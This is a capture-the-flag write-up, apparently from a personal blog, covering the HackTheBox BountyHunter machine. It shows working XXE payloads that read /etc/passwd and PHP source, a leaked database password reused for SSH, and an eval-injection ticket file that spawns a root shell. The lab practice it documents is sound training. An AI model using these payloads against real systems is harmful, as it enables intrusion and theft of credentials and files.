---
title:  "HackTheBox — BountyHunter Writeup"
description: "This easy box consists of a web application that is vulnerable to an XML external entity injection. The vulnerability can be used to enumerate the users and obtain the login password from a php file."
categories: ['Writeup']
tags: ['HackTheBox', 'CTF']
permalink: hackthebox-bountyhunter-writeup
read_time: 8
date: 2022-07-20 02:30 +0200
image:
  path: /assets/img/cards/hackthebox-bountyhunter-writeup.png
---
BountyHunter is the first active machine I owned on HackTheBox, and this is my very first writeup. This easy box consists of a web application that is vulnerable to an XML external entity injection. The vulnerability can be used to enumerate the users and obtain the login password from a php file. After connecting to the machine through ssh, root access can be obtained by exploiting a code injection vulnerability in a Python script that can be run as root.

## Machine info

- OS: **Linux** 🐧
- Release Date: **24 Jul 2021**
- Difficulty: **Easy**
- Points: **20**

## User

I started with a usual [Nmap][nmap]{:target="_blank"} scan.

```bash
nmap -sC -sV -oA bountyhunter 10.10.11.100
```

> Note: If you have trouble understanding this or any other shell command, I recommend you to check out [explainshell.com][explainshell]. Also check `man` pages to explore other options of any tool (e.g. `man nmap`).


After running nmap scan, I got this output.

```
Nmap scan report for 10.10.11.100 (10.10.11.100)
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see, there are two open ports: **ssh** at **port 22**, and **http** at **port 80**. 

To see what is going on at the port 80, I opened up `http://10.10.11.100` in my web browser.

![](/uploads/{{ page.permalink }}/ss1.png)

There is a web page about a bug bounty hunter team. There is not much stuff on the page except some details that might be clues.

"*Can use Burp*" might be a hint to use [BurpSuite][burp]{:target="_blank"}, or "*Copyright &copy; John 2020*" at the bottom of the page may indicate there is a user named John.

![](/uploads/{{ page.permalink }}/ss2.png)

I kept these things in mind and continued exploring.

All the links on the page are just links to the different parts of the same page, except that "Portal" link in the navigation, which leads to `http://10.10.11.100/portal.php`.

![](/uploads/{{ page.permalink }}/ss3.png)

This page (`/portal.php`) tells visitors to visit another page. There is nothing interesting in the page source, so I just clicked on that blue link to proceed.

After following the link, I got to this form.

![](/uploads/{{ page.permalink }}/ss4.png)

Before proceeding, I decided to utilize what I knew so far to scan for more content using [dirb][dirb]{:target="_blank"}. By looking at the file extensions (e.g. portal**.php**) I could tell that the app is written in php. I ran dirb and specified `.php` extension.

```bash
dirb http://10.10.11.100/ -X .php
```

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jul  9 21:13:29 2022
URL_BASE: http://10.10.11.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.100/ ----
```

I let dirb run in the background while I explored the form.

![](/uploads/{{ page.permalink }}/ss5.png)

I tried submitting some dummy data to see what happens.

![](/uploads/{{ page.permalink }}/ss6.png)

Submitted data is being reflected back on the same page. I opened up the Network tab in Firefox DevTools and submitted the form again to see what is happening.

![](/uploads/{{ page.permalink }}/ss7.png)

We can see it's making a `POST` request to `http://10.10.11.100/tracker_diRbPr00f314.php` with a base64 string in the request body.

Decoding the base64 string from the request body returned this XML.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>Test</title>
                <cwe>CWE-100</cwe>
                <cvss>8</cvss>
                <reward>3000</reward>
                </bugreport>
```

The response to this request is the following HTML, reflecting back the submitted data.

![](/uploads/{{ page.permalink }}/ss8.png "Network tab")

Since the application is reading XML input and reflecting the values back, I figured there may be a possibility for an **XML external entity (XXE) injection**. 

If you are not familiar with XXE, I highly recommend you to check out this article on PortSwigger Web Security Academy: [https://portswigger.net/web-security/xxe][xxe]{:target="_blank"}.

For modifying requests and examining responses I used BurpSuite's Repeater instead of DevTools because it's much easier.

![](/uploads/{{ page.permalink }}/ss9.png "Burp suite")

For a quicker base64 and URL encoding, I used [CyberChef][cyberchef]{:target="_blank"}.

![](/uploads/{{ page.permalink }}/ss10.png "Cyber chef")

I started with a simple payload from this [XXE injection payload list][xxe-payloads]{:target="_blank"}.

This was my modified XML before encoding it to base64.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY example "lazicdusan.com"> ]>
<bugreport>
<title>&example;</title>
<cwe>CWE-100</cwe>
<cvss>8</cvss>
<reward>3000</reward>
</bugreport>
```

That `&example;` entity should be replaced with a string `lazicdusan.com` in the response.

I encoded the XML to base64, sent the request and I got this response.

```html
(...)
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>lazicdusan.com</td>
  </tr>
  <tr>
(...)
```

It worked. The next thing I tried is to perform local file inclusion and get `/etc/passwd`. Payload in the following XML is from the same payload list.

**Request:**
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<bugreport>
<title>&xxe;</title>
<cwe>CWE-100</cwe>
<cvss>8</cvss>
<reward>3000</reward>
</bugreport>
```

**Response:**
```html
(...)
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
(...)
```
It worked!

I had /etc/passwd/ file so I could enumerate the users of the system. 

The first column in /etc/passwd represents the user's username, and the last one represents the absolute path to the user's shell. Most of the users listed in /etc/passwd file can't actually login, and their shell is set to `/usr/sbin/nologin`. To see the users who can login, we can look for the users that have their shell set to `/bin/bash`.

I saved the response in a file and searched for `/bin/bash` using grep.

```bash
cat response.html | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
```

Besides root, there is only one user and he goes by the name **development**.

Before proceeding, I checked if dirb has found anything.
```
(...)
---- Scanning URL: http://10.10.11.100/ ----
+ http://10.10.11.100/db.php (CODE:200|SIZE:0)
+ http://10.10.11.100/index.php (CODE:200|SIZE:25169)
+ http://10.10.11.100/portal.php (CODE:200|SIZE:125)
```

Here are the results. I've already seen index.php and portal.php, but that db.php was new and interesting.

I used the following payload from the same payload list to try to read the source code of that file.

**Request:**
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>
<bugreport>
<title>&xxe;</title>
<cwe>CWE-100</cwe>
<cvss>8</cvss>
<reward>3000</reward>
</bugreport>
```
**Response:**
```html
(...)
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
(...)
```
Decoding the base64 string returned this PHP code:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

There are some credentials to a database that is yet to be implemented. Since the database does not exist, I figured that I was probably supposed to use these credentials somewhere else.

At the moment I knew that there is a user "development", and the port 22 (ssh) is open. I assumed that this user could have reused their password.

I attempted to login as *development* using this password through ssh.

![](/uploads/{{ page.permalink }}/ss11.png)

That did work, user owned. 🎉

## Root

I started by looking at the home dir.

```
development@bountyhunter:~$ ls
contract.txt  user.txt
```

There is contract.txt.

```
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

This is a message from John. If you remember, his name appears in the page footer.

I ran `sudo -l` to see which commands I could run as root.

```
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

I could run `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as root. Let's have a look at this Python script.

```py
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
This is just a puzzle where the goal is to get to the `eval` function and execute arbitrary Python code. My goal was to spawn a root shell by executing `__import__('os').system('/bin/bash')`.

Basically, the script reads a file and a part of the file is being run inside the eval function. Here follows a step by step procedure of how I created the file that got me a root shell.

1. Filename must end with .md
```py
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```
2. First line of the file must start with `# Skytrain lnc`
```py
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
```
3. Second line of the file must start with `## Ticket to`
```py
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
```
4. Third line of the file must start with `__Ticket Code:__`
```py
        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue
```
5. Fourth line must start with `**`
```py
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
```
6. `**` must be followed by a number that gives remainder of 4 when divided by 7 (number `11`) and `+` sign.
```py
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False
```
7. Everything in fourth line after `**` gets into eval function. In our case, it will be `11+__import__('os').system('/bin/bash')`


I ended up with this:
```md
# Skytrain Inc
## Ticket to 
__Ticket Code:___
**11+__import__('os').system('/bin/bash')
```

I saved it and ran the script.

![](/uploads/{{ page.permalink }}/ss12.png "Rooted")

Rooted! 🔥

# Conclusion

BountyHunter was the first active machine I owned. I really enjoyed this box because it's beginner friendly, I was already familiar with xxe injection, and getting the root was mostly a fun puzzle.

It was a great box for applying some things I learned at [PortSwigger Web Security Academy](https://portswigger.net/web-security){:target="_blank"} which I also recommend.

That's all for this writeup! Thank you for reading and have a great day.

[explainshell]: https://explainshell.com/explain?cmd=nmap+-sC+-sV+-oA+bountyhounter+10.10.11.100
[nmap]: https://nmap.org/
[burp]: https://portswigger.net/burp/communitydownload
[dirb]: https://www.kali.org/tools/dirb/
[xxe]: https://portswigger.net/web-security/xxe
[xxe-payloads]: https://github.com/payloadbox/xxe-injection-payload-list
[cyberchef]: https://gchq.github.io/CyberChef